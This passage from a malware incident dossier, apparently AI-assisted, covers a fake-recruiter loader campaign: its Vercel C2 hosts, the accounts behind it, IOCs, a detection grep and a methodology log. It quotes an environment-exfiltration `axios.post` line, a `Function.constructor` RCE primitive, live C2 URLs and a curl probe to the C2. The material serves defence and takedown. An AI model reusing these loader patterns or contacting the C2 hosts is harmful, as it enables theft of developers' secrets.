- **Most likely**: the operator's IP allowlist on this deployment is broad (or simply not configured at all) — sub-shape B's loader is the buggy one that doesn't actually fire on the wire (missing `.end()`), so the operator may have considered IP-gating less important here, or the deployment never received gating logic before being staged for active use.
- **Less likely**: the researcher IP is in the operator's allowlist by coincidence (e.g., shared subnet with a prior victim).

Either way, the stage-2 payload is now captured for separate offline reverse-engineering. The `isillegalregion.com` deployment is **still serving** as of 2026-05-18 07:40 UTC — Vercel has not yet taken it down (in contrast to `cookie-xi-seven.vercel.app` and `ip-check-api.vercel.app`, both of which return `HTTP 451 x-vercel-error: DEPLOYMENT_DISABLED`). It is the top-priority Vercel takedown target for this incident — see [`abuse-report-vercel.md`](./abuse-report-vercel.md).

For the original C2 `www.ipregionchecker.com`: DNS still returns empty because **the apex is on registrar `client hold`** at Unstoppable Domains (set 2026-05-07 per RDAP). The domain itself is frozen — likely already actioned by the registrar following an earlier abuse report. The status is `client hold` + `client delete prohibited` + `client transfer prohibited` + `client update prohibited`, which prevents the operator from re-pointing it. Static-blocklist value remains; live-reachability value does not.

### 7.7 Vercel hosts the realfraction-family C2 infrastructure

Three of the four known realfraction-family C2 hosts are Vercel deployments:

| Host | Hosting | Status (2026-05-18) | IPv4 |
|---|---|---|---|
| `www.ipregionchecker.com` | Unstoppable Domains DNS (apex on client hold; not on Vercel) | registrar-frozen | (no resolution) |
| `www.isillegalregion.com` | Vercel (`ns1.vercel-dns.com` / `ns2.vercel-dns.com`) | **live; serving stage-2** | 64.29.17.65 / 216.198.79.1 |
| `cookie-xi-seven.vercel.app` | Vercel | **DEPLOYMENT_DISABLED** (already actioned) | 64.29.17.3 / 216.198.79.3 |
| `ip-check-api.vercel.app` | Vercel | **DEPLOYMENT_DISABLED** (already actioned) | 64.29.17.3 / 216.198.79.3 |

This contradicts the original case file's claim that the realfraction-family is non-Vercel — that claim was based on the apex `ipregionchecker.com` not appearing to be Vercel-hosted, but the renamed sibling `isillegalregion.com` and the two `.vercel.app` deployments make Vercel the **predominant** hosting platform for this generation. A Vercel abuse filing is therefore in-scope for this incident. See [`abuse-report-vercel.md`](./abuse-report-vercel.md).

For the live `isillegalregion.com` deployment, the appropriate takedown path is twofold:

- **Vercel abuse desk** — to disable the deployment behind the domain.
- **Registrar abuse desk (Name.com)** — to revoke the `isillegalregion.com` domain itself so the operator can't re-point it at a different host.

Both are in-scope. See [`abuse-report-vercel.md`](./abuse-report-vercel.md) and [`abuse-report-registrar.md`](./abuse-report-registrar.md).

### 7.8 Operator-account classification

Owners of confirmed sibling repos partition cleanly into three groups:

- **Operator-owned (suspend)** — small, recently-created orgs or single-purpose user accounts whose repo list is overwhelmingly campaign-shape:
  - Orgs: `realfraction` · `chainvisita-protocols` · `Chainbits1` · `Lynqex-Labs` · `metapulse54` · `RockTxoi` · `jaiu3d` · `kio87j` · `BVSLabs` (with `chainvisita-protocols` and `Lynqex-Labs` additionally exhibiting the **credibility-farming TTP** — forking ~5–11 well-known crypto/blockchain projects on the same day the org was created to pad the public profile).
  - Users: `Cortexa-org` (despite the `-org` suffix this is a User account; multi-lure-theme persona spanning `NitroGem` + `EHR-Demo` + `intelhealthcare` + `Neura-MVP`) · `0xbrentfi`.
  - Uncertain-leans-operator: `ricardomartins9899` · `sparsh-kr24` (both single-repo accounts but with creation dates older than the typical operator-throwaway window).

- **Likely compromised legitimate / candidate-fooled (investigate, don't suspend)** — accounts with substantial real-developer history (multi-year, multi-language, multi-domain repos) where a single realfraction-family repo appears:
  - `slobodanmargetic988` · `LandinLin` · `devcode8` · `eastmade` · `MBhatti26` · `fabiolin` · `sharmapranay38` · `shri33` · `Paulooo0` · `KagiyamaWeb` · `Wilovy09` · `pablodiaz2799` · `Jay-Sojitra` · `ahmedraza90`.

  The "compromised" framing in the existing dossier conventions fits the *outcome* (a malicious repo appears on the account); the more likely *mechanism* in this cohort is that these users are real candidates who completed a take-home assignment from the operator and then publicly pushed the resulting (loader-embedded) codebase to their own GitHub account. That is also why so many of these accounts have one malicious repo amidst dozens of unrelated personal projects.

- **Real developers named in trojan-commit authorship but not operator-controlled** — `urmybestfriend` · `cncolder` · `hinchley2018` · `danbovey`. Already covered in §7.2. The operator forked a legitimate scaffold and either preserved or re-attributed commits to these handles.

The signal codes (A · S · C) the dossier uses for justifying operator-owned classifications, and per-org details (numeric IDs, creation dates, sibling-creation patterns), are in [`iocs.json`](./iocs.json) under `github.organizations` and `github.users`. The same data drives the filing checklist in [`abuse-report-github.md`](./abuse-report-github.md).

### 7.9 New IOCs added to the dossier

Summary of what's new in [`iocs.csv`](./iocs.csv) / [`iocs.json`](./iocs.json) from this sweep:

- **Domains**: `www.isillegalregion.com` + apex (Name.com / Vercel; **live**), `cookie-xi-seven.vercel.app` (DEPLOYMENT_DISABLED), `ip-check-api.vercel.app` (DEPLOYMENT_DISABLED). Plus the registrar/nameserver context for `www.ipregionchecker.com` (Unstoppable Domains, client hold) and the lure-brand `realfraction.xyz` (Namecheap).
- **IPv4**: `64.29.17.65`, `216.198.79.1` (Vercel edge for isillegalregion.com); `64.29.17.3`, `216.198.79.3` (Vercel edge for the two disabled deployments); `162.255.119.72` (Namecheap parking for realfraction.xyz).
- **URLs**: full C2 endpoint for each sub-shape with the per-instance suffix (`3aeb34a31` / `3aeb34a37` / `3aeb34a38` / `3aeb34a39` for sub-shapes A/C/A/B respectively; `6KDisdfjlskjDI837KJH4` for sub-shape G; `3948uf2uhe9r298rh2` for sub-shape H).
- **Code patterns**: the new RCE primitive `new Function.constructor("require", errCode)`; the env-exfil-at-loader-stage `axios.post(api, { ...process.env }, { headers: { "x-secret-header": "secret" } })`; the buggy `axios.post(api, { headers: ... })` variant; the distinctive sub-shape G constants template.
- **HTTP headers**: `x-vercel-error: DEPLOYMENT_DISABLED` (observed on the two disabled deployments — corroborating signal that a known C2 has been taken down); `Server: Vercel` (on the live `isillegalregion.com` host).
- **Hashes**: the stage-2 payload SHA-256 / SHA-1 / size (see §7.6).
- **GitHub entities**: 9 new operator-owned orgs (excluding the renamed `ChainVisitaTech` → `chainvisita-protocols`), 2 operator-owned users, 2 uncertain-leans-operator users, 14 likely-compromised-legitimate users, 27 confirmed sibling repos (plus 3 inferred siblings on confirmed-operator-owned accounts).

### 7.10 Catalog impact (post-sweep update)

After the 2026-05-18 cluster-expansion sweep, the §7.4 conclusions are updated as follows:

1. **The realfraction-family is no longer separate from the AjunaVerse-family at the operator level — they overlap.** Three independent overlap signals from §7.5 confirm this:
   - **Sub-shape H's RCE primitive `new Function.constructor("require", errCode)` is the AjunaVerse-family RCE primitive** (`Function.constructor === Function`), paired with the realfraction-family magic header.
   - **Sub-shape E (`app/controllers/settingController.js`) appears in seven existing AjunaVerse-earlier-catalog repos** as a second loader alongside the AjunaVerse-earlier loader in `frontController.js`. These are dual-loader repos.
   - **Vercel hosting is shared** between AjunaVerse-family C2s and three of the four realfraction-family C2s.

   The two families should be treated as **branches of a single operator's loader toolkit**, not as separate clusters. The catalog continues to label them by their distinctive magic header (`x-app-request: ip-check` vs `x-secret-header: secret`) because that's the cleanest defensive distinction, but campaign attribution treats them as one operator.

2. **The diagnostic grep needs another widening pass.** The previous widening was insufficient — sub-shapes G and H were missed. The current widest grep that catches all known fingerprints across both families:

   ```
   grep -RIn -E \
     'new Function(\.constructor)?\(["'\'']require["'\''],|verify\(setApiKey|x-app-request|x-secret-header|"runOn"[[:space:]]*:[[:space:]]*"folderOpen"|ipregionchecker\.com|isillegalregion\.com|cookie-xi-seven\.vercel\.app|ip-check-api\.vercel\.app|ipcheck-encrypted|ip-check-encrypted' \
     --exclude-dir=node_modules --exclude-dir=.git .
   ```

   See [`detection-rules.md`](./detection-rules.md) §3 for the canonical version (kept in sync with the rules YARA / Sigma).

3. **Sibling-repo hunting is no longer a TODO.** The sweep has been run; the catalog is in §7.5. Further hunts are useful if and when the operator rotates infrastructure — the recommended re-hunt seeds are listed in §7.5's sub-shape table (C2 hosts, API-key tokens, RCE-primitive patterns).

4. **The realfraction-family is materially larger than the dossier reflected before this sweep.** Pre-sweep: 1 confirmed repo + 1 unverified sibling. Post-sweep: 27+ confirmed repos in 8 sub-shapes across 4 C2 hosts and ~11 operator-owned orgs/users. The cluster remains in this single incident folder (per the user's "default to keeping everything in one folder unless volume forces a split" guidance) — but if the operator rotates loader idioms again, the next sweep should reconsider whether a `2026-05-18-realfraction` / `2026-05-18-realfraction-stockx` / `2026-05-18-realfraction-skilltest` per-sub-cluster split would aid navigation.

---

## 8. IOCs (in prose)

For machine-readable forms, see [`iocs.csv`](./iocs.csv) and [`iocs.json`](./iocs.json).

**Domains / URLs**

- `www.ipregionchecker.com` — sole loader-side C2. Confidence: **high** (hardcoded in the malicious file).
- `ipregionchecker.com` (apex) — likely also operator-controlled. Confidence: medium.
- Full URL: `https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a31` — POST endpoint that returns the negative-gate sentinel or the stage-2 JS payload depending on caller IP. Confidence: high.

**HTTP indicators**

- `x-secret-header: secret` — magic header sent client→C2. Distinctive; essentially zero false-positive on outbound HTTP from developer hosts.
- Response body `blocked` (7-byte literal) and JSON `{"blocked":true}` — negative-gate sentinels. Useful in a proxy-body inspection to detect that a host on the network was a non-target attempting to reach the C2.

**Code patterns**

- `https.request(... 'x-secret-header': 'secret' ...)` and `eval(data)` in the same Node module — high-signal, low-false-positive.
- `const regionChecker = require("../utils/regionChecker");` followed by no use of `regionChecker` — side-effect-only import smell. Generic but worth pairing with the above.

**GitHub**

- Repo: `realfraction/realfraction`. Generation: distinct from both AjunaVerse-family generations (separate loader path, primitive, header, and C2 family).
- Owning org: `realfraction` (single-repo GitHub org; contact email `hello@realfraction.xyz`).
- Trojan commit: `8cc5120bfa3a64a6af14936ce821092ea08cd78d` by `urmybestfriend`, subject `feat(server): add search, pagination, and apiFeatures utils` — adds `server/utils/regionChecker.js` and `server/utils/errorHandler.js` (neither matches the stated subject).
- File path: `server/utils/regionChecker.js`.

**TTP cluster**

- Matches publicly documented "Contagious Interview" / Famous Chollima / Void Dokkaebi TTP family (fake recruiter → clone repo → `npm install` / `npm start` → stealer-loader) per Microsoft, Trend Micro, ReversingLabs reporting. Specifically the `userController.js`-as-loader-host archetype catalogued in `rubenmarcus/malicious-repositories` under `real_estate/`, with the payload moved out of `userController.js` itself into a side-effect-imported sibling utility module.

---

## 9. Reproducibility / methodology audit log

What was actually done during this analysis, in chronological order, so the work can be re-run or audited:

1. Profile / metadata: fetched `https://github.com/realfraction/realfraction` and `https://github.com/realfraction` via `WebFetch` to confirm owning-account type, repository count, and lure framing.
2. File tree enumeration via `WebFetch` against `https://github.com/realfraction/realfraction/tree/main/<path>` for `server/`, `server/controllers/`, `server/routes/`, `server/services/`, `server/utils/`, `server/middlewares/`, `.vscode/`.
3. Raw file fetches via `WebFetch` against `https://raw.githubusercontent.com/realfraction/realfraction/main/<path>` for:
   - `README.md` (decoy-pitch claims).
   - `package.json` (script-side analysis of where the loader fires).
   - `.gitignore`.
   - `server/server.js`, `server/app.js`.
   - `server/controllers/realfractionController.js` (clean).
   - `server/controllers/userController.js` — found the side-effect `require` of `regionChecker`.
   - `server/controllers/paymentController.js`, `orderController.js`, `productController.js` (all clean upstream-fork boilerplate).
   - `server/routes/userRoute.js` (confirms wiring of `userController`).
   - `server/utils/regionChecker.js` — the loader, captured verbatim.
4. Commit-history check via `WebFetch` against `https://github.com/realfraction/realfraction/commits/main/server/utils/regionChecker.js` and the commit page for `8cc5120…`. Confirmed the file was introduced in a single commit with a misleading subject.
5. Dynamic-reach probes: `getent hosts`, `curl -X POST -H 'x-secret-header: secret' …` against the C2 URL, plus DoH `dns.google` / `cloudflare-dns.com` via `WebFetch`. All returned no-resolution / `ECONNREFUSED` / `HTTP 403` from this sandbox.
6. Cluster cross-reference: `WebSearch` for `"ipregionchecker.com" malware loader npm github`, `"regionChecker.js" "eval" github malicious recruiter`, and `"realfraction" github recruiter web3 real estate suspicious`. `WebFetch` against `https://github.com/rubenmarcus/malicious-repositories` to confirm the `real_estate/` archetype.

No `git clone` was performed; no JS from the repo was executed; no `npm install` was performed. The single-line and multi-line code excerpts in this report were transcribed from `WebFetch` output and are verbatim against `raw.githubusercontent.com/realfraction/realfraction/main/...`.

---

## 10. Acknowledgements

Thanks to **[Michał Niewrzał (@mniewrzal)](https://github.com/mniewrzal)** for flagging this repository and forwarding it for analysis. Catching campaign-shape repos early — and routing them to someone who can write up the loader, the IOCs, and the takedown templates — is how this cluster's footprint gets reduced.
